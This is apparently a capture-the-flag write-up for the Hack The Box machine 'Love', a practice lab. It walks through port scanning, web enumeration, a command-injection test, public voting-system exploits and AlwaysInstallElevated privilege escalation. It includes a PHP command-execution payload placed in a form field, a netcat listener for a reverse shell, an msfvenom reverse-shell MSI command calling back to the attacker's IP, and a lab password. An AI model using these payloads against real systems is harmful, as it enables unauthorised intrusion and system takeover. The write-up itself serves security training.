---
title: "Love"
date: 2024-09-27
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "htb writeup", "love", "htb walkthrough", "hackthebox", "writeup"]
---

## Credentials

| Username | Password           | Hash | Source |
| -------- | ------------------ | ---- | ------ |
| admin    | @LoveIsInTheAir!!! |      |        |
 
## Enumeration

### Nmap

```sh
PORT      STATE SERVICE      REASON  VERSION
80/tcp    open  http         syn-ack Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Voting System using PHP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     syn-ack Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/organizationalUnitName=love.htb/localityName=norway/emailAddress=roy@love.htb
| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/organizationalUnitName=love.htb/localityName=norway/emailAddress=roy@love.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-18T14:00:16
| Not valid after:  2022-01-18T14:00:16
| MD5:   bff0:1add:5048:afc8:b3cf:7140:6e68:5ff6
| SHA-1: 83ed:29c4:70f6:4036:a6f4:2d4d:4cf6:18a2:e9e4:96c2

|_http-title: 403 Forbidden
445/tcp   open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?       syn-ack
| mysql-info: 
|_  MySQL Error: Host '10.10.14.42' is not allowed to connect to this MariaDB server
| fingerprint-strings: 
|   Arucer, Hello, NULL, SSLSessionReq, ZendJavaBridge, afp, dominoconsole, epmd, gkrellm, ibm-mqseries, mongodb, redis-server, riak-pbc, tarantool, vp3: 
|_    Host '10.10.14.42' is not allowed to connect to this MariaDB server
5000/tcp  open  http         syn-ack Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown      syn-ack
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2024-07-21T08:04:42+00:00; +21m34s from scanner time.
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Issuer: commonName=LOVE
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-11T14:39:19
| Not valid after:  2024-04-10T14:39:19
| MD5:   d35a:2ba6:8ef4:7568:f99d:d6f4:aaa2:03b5
| SHA-1: 84ef:d922:a70a:6d9d:82b8:5bb3:d04f:066b:12f8:6e73

|_http-title: Not Found
7680/tcp  open  pando-pub?   syn-ack
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack Microsoft Windows RPC
49670/tcp open  msrpc        syn-ack Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.94SVN%I=9%D=7/21%Time=669CB9F8%P=x86_64-pc-linux-

```

### 80-HTTP

#### Gobuster

![screenshot](/assets/images/love11.png)

#### Web

![screenshot](/assets/images/love1.png)

http://staging.love.htb/

![screenshot](/assets/images/love2.png)

http://staging.love.htb/beta.php

![screenshot](/assets/images/love3.png)

#### Test for command injection

![screenshot](/assets/images/love7.png)

![screenshot](/assets/images/love6.png)

#### Test for reverse shell

```sh
# kali
python3 -m http.server 80
# kali
nc -lvnp 9001
# form
http://10.10.14.42/$(<?=`$_GET[0]`?>)
```

![screenshot](/assets/images/love8.png)

#### /admin

http://10.10.10.239/Admin/

![screenshot](/assets/images/love9.png)

#### /plugins

http://10.10.10.239/plugins/

![screenshot](/assets/images/love10.png)

## Initial Access

>- Searching for `voting system` gives public exploit
- Using the public exploit gives initial shell as phoebe.

https://www.exploit-db.com/exploits/49843

![screenshot](/assets/images/love12.png)

http://10.10.10.239/admin

![screenshot](/assets/images/love13.png)

http://10.10.10.239/

![screenshot](/assets/images/love14.png)

-> doesn't work on this URL

![screenshot](/assets/images/love15.png)

https://www.exploit-db.com/exploits/49846

![screenshot](/assets/images/love16.png)

upload a shell

![screenshot](/assets/images/love17.png)

rev.ps1

![screenshot](/assets/images/love18.png)

![screenshot](/assets/images/love19.png)

PHP Ivan web shell

![screenshot](/assets/images/love20.png)

## Privilege Escalation

>- AlwaysInstallElevated

![screenshot](/assets/images/love21.png)

![screenshot](/assets/images/love22.png)

![screenshot](/assets/images/love23.png)

![screenshot](/assets/images/love24.png)

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation

![screenshot](/assets/images/love25.png)

```sh
msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.42 LPORT=443 -f msi -o rev.msi
```

![screenshot](/assets/images/love26.png)
